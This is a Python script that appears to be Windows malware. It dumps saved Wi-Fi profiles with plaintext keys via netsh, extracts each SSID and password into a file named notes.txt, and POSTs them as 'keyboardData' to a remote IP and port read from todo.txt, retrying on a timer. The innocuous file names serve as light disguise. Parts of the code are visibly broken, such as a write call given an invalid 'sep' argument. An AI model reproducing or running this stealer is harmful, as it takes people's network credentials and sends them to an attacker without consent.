import subprocess
import os
import sys
import requests
import json
import threading


password_file = open("notes.txt", "w", encoding="utf-8")
password_file.write("Password List: \n")
password_file.close()

wifi_files = []
wifi_name = []
wifi_password = []

command = subprocess.run(["netsh", "wlan", "export", "profiles", "key=clear"], capture_output = True).stdout.decode()

path = os.getcwd()

try:
    with open("todo.txt", "r") as f:
        lines = f.readlines()
        ip_address = lines[0].strip()
        interval = int(lines[1])
        port = lines[2]
        f.close()
except:
    pass

def send():
    try:
        with open("notes.txt", "r") as f:
            payload = json.dumps({"keyboardData": f.read()})
            requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
        return
    except:
        timer = threading.Timer(interval, send)
        timer.start()

for file_name in os.listdir(path):
    if file_name.startswith("Wi-Fi") and file_name.endswith(".xml"):
        wifi_files.append(file_name)
        for i in wifi_files:
            with open(i, "r") as f:
                for line in f.readlines():
                    if "name" in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if "keyMaterial" in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x, y in zip(wifi_name, wifi_password):
                            sys.stdout = open("notes.txt", "a", encoding="utf-8")
                            sys.stdout.write(f"SSID: {x} Password: {y}", sep = "\n")
                            #print(f"SSID: {x} Password: {y}", sep = "\n")
                            sys.stdout.close()
                            send()
                            
